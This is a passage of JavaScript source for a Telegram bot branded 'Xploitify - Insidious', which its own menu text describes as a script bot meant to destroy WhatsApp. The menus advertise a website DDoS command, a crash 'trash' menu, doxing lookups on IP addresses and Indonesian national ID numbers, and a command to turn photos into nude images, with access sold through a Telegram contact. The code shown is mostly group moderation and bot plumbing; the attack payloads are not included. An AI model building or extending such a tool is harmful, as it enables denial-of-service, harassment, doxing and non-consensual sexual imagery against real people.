      replyMarkup = { inline_keyboard: [[{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }

    if (query.data === "toolsmenu") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
( 🍁 ) Olá ${username} ¿
─ 私は WhatsApp を破壊することを目的とした <b>Xploitify - Insidious </b>スクリプトボットです。よく使用してください。

✦••┈┈ ( 🍂 ) - 𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version :  Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─( 🛠 )</b></blockquote>
<b>┃☰. - /ddoswebsite « Url »
〢-╰➤ ° ↯ Attack Website ¡
┃☰. - /fixcode « Reply Code »
〢-╰➤ ° ↯ Fixing Code Error ¡
┃☰. - /play « Song Name »
〢-╰➤ ° ↯ Search Music ¡
┃☰. - /ssiphone « Query »
〢-╰➤ ° ↯ Screenshot WhatsApp Ip ¡
┃☰. - /addfiture « Reply Code »
〢-╰➤ ° ↯ Add New Fitures ¡
┃☰. - /removebg « Reply Image »
〢-╰➤ ° ↯ Delete Baground Image ¡
┃☰. - /watermark « Reply Image »
〢-╰➤ ° ↯ Adding Watermark to Photos ¡
┃☰. - /tiktokdl « Url »
〢-╰➤ ° ↯ Download Media Tiktok ¡
┃☰. - /instagramdl « Url »
〢-╰➤ ° ↯ Download Media Instagram ¡
┃☰. - /pinterest « Query »
〢-╰➤ ° ↯ Search Image From Pinterest ¡</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "𖣂 ¡ #- Xploitify° ─( 👥 )", callback_data: "grupmenu" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🔍 )", callback_data: "doxingmenu" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🛠️ - ➡️ )", callback_data: "tools_v2" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }
    
        if (query.data === "tools_v2") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
<b>( 🍁 ) Olá ${username} ¿</b>
<b>─ 私は WhatsApp を破壊することを目的とした Xploitify - Insidious スクリプトボットです。よく使用してください。</b>

✦••┈┈ ( 🍂 ) - <b>𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧</b> ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version : Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─ ( 🛠 )</b></blockquote>
<b>┃☰. - /restart</b>
<b>〢-╰➤ ° ↯ Restart Bot Telegram ¡</b>
<b>┃☰. - /update « Reply File »</b>
<b>〢-╰➤ ° ↯ Replacing The index.js File ¡</b>
<b>┃☰. - /chatowner « Text »</b>
<b>〢-╰➤ ° ↯ Message Owner From Bot ¡</b>
<b>┃☰. - /sticker « Reply Image »</b>
<b>〢-╰➤ ° ↯ Convert Image To Sticker ¡</b>
<b>┃☰. - /getcode « Url »</b>
<b>〢-╰➤ ° ↯ Fetch HTML Code ¡</b>
<b>┃☰. - /enchtml « Reply File »</b>
<b>〢-╰➤ ° ↯ Locking HTML Code ¡</b>
<b>┃☰. - /tourl « Reply Image »</b>
<b>〢-╰➤ ° ↯ Upload Image To Link ¡</b>
<b>┃☰. - /brat « Text »</b>
<b>〢-╰➤ ° ↯ Sticker Brat ¡</b>
<b>┃☰. - /tonaked « Reply Image »</b>
<b>〢-╰➤ ° ↯ To Naked Girls ¡</b>
<b>┃☰. - /update</b>
<b>〢-╰➤ ° ↯ Update Manual ¡</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🛠️ - ⬅️ )", callback_data: "toolsmenu" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }
    
    
        if (query.data === "grupmenu") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
<b>( 🍁 ) Olá ${username} ¿</b>
<b>─ 私は WhatsApp を破壊することを目的とした Xploitify - Insidious スクリプトボットです。よく使用してください。</b>

✦••┈┈ ( 🍂 ) - <b>𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧</b> ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version : Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─ ( 👥 )</b></blockquote>
<b>┃☰. - /promote « Reply Users »</b>
<b>〢-╰➤ ° ↯ Promote Users In Groups ¡</b>
<b>┃☰. - /demote « Reply Users »</b>
<b>〢-╰➤ ° ↯ Demote Users In Groups ¡</b>
<b>┃☰. - /setwelcome « Text / Photo »</b>
<b>〢-╰➤ ° ↯ Custom Text Welcome ¡</b>
<b>┃☰. - /welcome « on|off »</b>
<b>〢-╰➤ ° ↯ Settings On / Offline Welcome ¡</b>
<b>┃☰. - /kick « Reply Users »</b>
<b>〢-╰➤ ° ↯ Kick Users From Groups ¡</b>
<b>┃☰. - /warn « Reply Users »</b>
<b>〢-╰➤ ° ↯ Giving A Warning ¡</b>
<b>┃☰. - /unwarn « Reply Users »</b>
<b>〢-╰➤ ° ↯ Delete A Warning ¡</b>
<b>┃☰. - /addblocklist « Text »</b>
<b>〢-╰➤ ° ↯ Add Forbidden Words ¡</b>
<b>┃☰. - /delblocklist « Text »</b>
<b>〢-╰➤ ° ↯ Delete Forbidden Words ¡</b>
<b>┃☰. - /blocklist</b>
<b>〢-╰➤ ° ↯ See All Blocklist ¡</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🔍 )", callback_data: "doxingmenu" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🛠️ - ⬅️ )", callback_data: "tools_v2" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }
    
            if (query.data === "doxingmenu") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
( 🍁 ) Olá ${username} ¿
─ 私は WhatsApp を破壊することを目的とした <b>Xploitify - Insidious </b>スクリプトボットです。よく使用してください。

✦••┈┈ ( 🍂 ) - 𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version :  Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─( 🔍 )</b></blockquote>
<b>┃☰. - /trackip « IP Adress »
〢-╰➤ ° ↯ Search Information IP Adress ¡
┃☰. - /nikparse « NIK »
〢-╰➤ ° ↯ Search Information NIK ¡</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "𖣂 ¡ #- Xploitify° ─( 👥 )", callback_data: "grupmenu" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( 🛠️ - ⬅️ )", callback_data: "tools_v2" }],
      [{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
<b>( 🍁 ) Olá ${username} ¿</b>
<b>─ 私は WhatsApp を破壊することを目的とした Xploitify - Insidious スクリプトボットです。よく使用してください。</b>

✦••┈┈ ( 🍂 ) - <b>𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧</b> ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version : Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─ ( 🫀 )</b></blockquote>
<b>┃☰. dàpz. hólo</b>
<b>〢-╰➤ ° ↯ dapaa || Author ¡</b>
<b>〢-╰➤ ° ↯ ojann || Best Friend ¡</b>
<b>〢-╰➤ ° ↯ paikk || Best Friend ¡</b>
`;
      replyMarkup = { inline_keyboard: [[{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
( 🍁 ) Olá ${username} ¿
─ 私は WhatsApp を破壊することを目的とした <b>Xploitify - Insidious </b>スクリプトボットです。よく使用してください。

✦••┈┈ ( 🍂 ) - 𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version :  Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Sender Statueˋs : ${senderStatus}</b>
<b>𖥊. - Memory Panel : ${memory}</b>
<b>𖥊. - Runtime Panel : ${runtime}</b>
<b>𖥊. - Cooldown Script : ${cooldown} Seconds</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "𖣂 ¡ #- Xploitify° ─( 🦠 )", callback_data: "trashmenu" },  
    ],
    [
      { text: "𖣂 ¡ #- Xploitify° ─( ⚙️ )", callback_data: "accesmenu" },
      { text: "𖣂 ¡ #- Xploitify° ─( 🛠 )", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "𖣂 ¡ #- Xploitify° ─( 🫀 )", callback_data: "thanksto" }
    ],
    [
      { text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: imageThumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});


// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /Connect 62xx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ ⵢ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// ~ Group Menu
const data = {}

function ensure(chatId) {
  if (!data[chatId]) {
    data[chatId] = {
      welcome: { enabled: true, text: "Selamat datang {name}!", photo: null },
      rules: "Belum ada rules.",
      warns: {},
      blocklist: []
    }
  }
}

function parseDurationToSeconds(s) {
  if (!s) return null
  const m = s.match(/^(\d+)(s|m|h|d)$/i)
  if (!m) return null
  const n = parseInt(m[1], 10)
  const u = m[2].toLowerCase()
  if (u === "s") return n
  if (u === "m") return n * 60
  if (u === "h") return n * 3600
  if (u === "d") return n * 86400
  return null
}

async function isAdmin(bot, chatId, userId) {
  const admins = await bot.getChatAdministrators(chatId)
  return admins.some(a => a.user.id === userId)
}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id
  ensure(chatId)
  const txt = msg.text || ""
  if (msg.new_chat_members && data[chatId].welcome && data[chatId].welcome.enabled) {
    for (const u of msg.new_chat_members) {
      const name = u.username ? "@" + u.username : u.first_name
      const caption = (data[chatId].welcome.text || "Welcome").replace(/\{name\}/g, name)
      const buttons = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "👥 Rules", callback_data: "show_rules" }],
            [{ text: "📢 Info Grup", callback_data: "show_info" }]
          ]
        }
      }
      try {
        if (data[chatId].welcome.photo) {
          await bot.sendPhoto(chatId, data[chatId].welcome.photo, { caption, ...buttons })
        } else {
          await bot.sendMessage(chatId, caption, buttons)
        }
      } catch {}
    }
  }
  if (msg.left_chat_member) {
    const name = msg.left_chat_member.username ? "@" + msg.left_chat_member.username : msg.left_chat_member.first_name
    try { await bot.sendMessage(chatId, `${name} keluar dari grup`) } catch {}
  }
  if (txt && /@admin/i.test(txt)) {
    try {
      const admins = await bot.getChatAdministrators(chatId)
      const mentions = admins.filter(a => !a.user.is_bot).map(a => a.user.username ? "@" + a.user.username : a.user.first_name).join(" ")
      await bot.sendMessage(chatId, "Memanggil admin:\n" + (mentions || "Tidak ada admin"))
    } catch {}
  }
  if (txt && data[chatId].blocklist && data[chatId].blocklist.length) {
    for (const bad of data[chatId].blocklist) {
      if (!bad) continue
      try {
        if (txt.toLowerCase().includes(bad.toLowerCase())) {
          await bot.deleteMessage(chatId, msg.message_id)
          return
        }
      } catch {}
    }
  }
})

bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id
  ensure(chatId)
  const d = q.data
  if (d === "show_rules") {
    await bot.answerCallbackQuery(q.id)
    await bot.sendMessage(chatId, `👥 Rules Grup:\n\n${data[chatId].rules}`)
    return
  }
  if (d === "show_info") {
    await bot.answerCallbackQuery(q.id)
    try {
      const chat = await bot.getChat(chatId)
      const desc = chat.description || "Tidak ada deskripsi grup."
      await bot.sendMessage(chatId, `📢 Info Grup:\n\n${desc}`)
    } catch { await bot.sendMessage(chatId, "Gagal mengambil deskripsi grup") }
    return
  }
  if (d === "welcome_on") {
    data[chatId].welcome.enabled = true
    await bot.answerCallbackQuery(q.id, { text: "Welcome Active" })
    await bot.sendMessage(chatId, "Welcome Active")
    return
  }
  if (d === "welcome_off") {
    data[chatId].welcome.enabled = false
    await bot.answerCallbackQuery(q.id, { text: "Welcome Non Active" })
    await bot.sendMessage(chatId, "Welcome Non Active")
    return
  }
  if (d.startsWith("clear_warn_")) {
    const parts = d.split("_")
    const uid = parseInt(parts[2], 10)
    data[chatId].warns[uid] = 0
    await bot.answerCallbackQuery(q.id, { text: "Warn direset" })
    await bot.sendMessage(chatId, "Warn user telah direset")
    return
  }
  if (d.startsWith("unwarn_")) {
    const uid = parseInt(d.split("_")[1], 10)
    const cur = data[chatId].warns[uid] || 0
    if (cur <= 0) {
      await bot.answerCallbackQuery(q.id, { text: "User tidak punya warn" })
      return
    }
    data[chatId].warns[uid] = cur - 1
    await bot.answerCallbackQuery(q.id, { text: "Warn dikurangi" })
    await bot.sendMessage(chatId, `Warn user berkurang (${data[chatId].warns[uid]}/3)`)
    return
  }
  if (d.startsWith("delblock_")) {
    const raw = d.replace("delblock_", "")
    const word = decodeURIComponent(raw)
    data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
    await bot.answerCallbackQuery(q.id, { text: "Kata dihapus" })
    await bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
    return
  }
  if (d === "unpin") {
    try { await bot.unpinChatMessage(chatId); await bot.answerCallbackQuery(q.id, { text: "Pesan di-unpin" }); await bot.sendMessage(chatId, "Pesan di-unpin") } catch { await bot.answerCallbackQuery(q.id, { text: "Gagal unpin" }) }
    return
  }
})

bot.onText(/^\/setrules(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const t = match && match[1] ? match[1].trim() : ""
  if (!t) return bot.sendMessage(chatId, "Gunakan: /setrules <rules>")
  data[chatId].rules = t
  bot.sendMessage(chatId, "Rules Updated !")
})

bot.onText(/^\/setwelcome(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const textArg = match && match[1] ? match[1].trim() : null
  if (textArg) data[chatId].welcome.text = textArg
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const ph = msg.reply_to_message.photo
    data[chatId].welcome.photo = ph[ph.length - 1].file_id
  }
  data[chatId].welcome.enabled = true
  await bot.sendMessage(chatId, "Welcome Updated !", {
  })
})

bot.onText(/^\/welcome\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id
  ensure(chatId)
  data[chatId].welcome.enabled = match[1].toLowerCase() === "on"
  bot.sendMessage(chatId, `Welcome ${data[chatId].welcome.enabled ? "Active !" : "Non Active !"}`)
})

bot.onText(/^\/addblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  ensure(chatId)
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  const word = match[1].trim()
  if (!word) return bot.sendMessage(chatId, "Gunakan: /addblocklist <pesan>")
  if (!data[chatId].blocklist.includes(word)) data[chatId].blocklist.push(word)
  bot.sendMessage(chatId, `${word} ditambahkan ke blocklist`, {
    reply_markup: { inline_keyboard: [[{ text: "Hapus kata", callback_data: "delblock_" + encodeURIComponent(word) }]] }
  })
})

bot.onText(/^\/delblocklist\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const word = match[1].trim()
  data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
  bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
})

bot.onText(/^\/blocklist$/i, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const list = (data[chatId].blocklist || []).join("\n") || "Blocklist kosong"
  bot.sendMessage(chatId, `📌 Blocklist:\n${list}`)
})

function getTarget(msg) {
  if (msg.reply_to_message && msg.reply_to_message.from) return msg.reply_to_message.from.id;

  const check = (entities, text) => {
    if (!entities || !text) return null;
    for (const e of entities) {
      if (e.type === 'text_mention' && e.user) return e.user.id;
      if (e.type === 'mention') return text.substring(e.offset + 1, e.offset + e.length);
    }
    return null;
  };

  const fromText = check(msg.entities, msg.text);
  if (fromText) return fromText;

  const fromCaption = check(msg.caption_entities, msg.caption);
  if (fromCaption) return fromCaption;

  return null;
}

async function resolveUsername(bot, chatId, username) {
  try {
    const members = await bot.getChatAdministrators(chatId)
    const found = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())
    return found ? found.user.id : null
  } catch {
    return null
  }
}

bot.onText(/^\/promote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true
    })
    bot.sendMessage(chatId, "Promoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal promote" + e)
  }
})

bot.onText(/^\/demote/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false
    })
    bot.sendMessage(chatId, "Demoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal demote" + e)
  }
})

bot.onText(/^\/mute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Mute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal mute user: ${e.message}`);
  }
});

bot.onText(/^\/unmute/, async (msg) => {
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Unmute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal unmute user: ${e.message}`);
  }
});

bot.onText(/^\/kick/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Kick !")
  } catch {
    bot.sendMessage(chatId, "Gagal kick")
  }
})

bot.onText(/^\/ban/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    bot.sendMessage(chatId, "User Banned !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal ban" + e)
  }
})

bot.onText(/^\/unban/, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Unbanned !")
  } catch {
    bot.sendMessage(chatId, "Gagal unban")
  }
})

bot.onText(/^\/warn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  data[chatId].warns[uid] = (data[chatId].warns[uid] || 0) + 1
  const cnt = data[chatId].warns[uid]
  if (cnt >= 3) {
    try {
      await bot.kickChatMember(chatId, uid)
      data[chatId].warns[uid] = 0
      await bot.sendMessage(chatId, `${reply.from.first_name} dikick karena 3 warn`, { reply_markup: { inline_keyboard: [[{ text: "Unban", callback_data: "unban_" + uid }]] } })
    } catch { await bot.sendMessage(chatId, "Gagal kick") }
  } else {
    await bot.sendMessage(chatId, `${reply.from.first_name} mendapat warn (${cnt}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Unwarn", callback_data: "unwarn_" + uid }, { text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
  }
})

bot.onText(/^\/unwarn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  if (!data[chatId].warns[uid] || data[chatId].warns[uid] <= 0) return bot.sendMessage(chatId, "User tidak punya warn")
  data[chatId].warns[uid] -= 1
  await bot.sendMessage(chatId, `Warn berkurang (${data[chatId].warns[uid]}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
})

bot.onText(/^\/pin$/i, async (msg) => {
  const chatId = msg.chat.id
  const reply = msg.reply_to_message
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  try {
    await bot.pinChatMessage(chatId, reply.message_id)
    await bot.sendMessage(chatId, "Pinned!", { reply_markup: { inline_keyboard: [[{ text: "Unpin Message", callback_data: "unpin" }]] } })
  } catch { await bot.sendMessage(chatId, "Gagal pin") }
})
// ~ Tools And Fun Menu
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ ⵢ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ ⵢ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
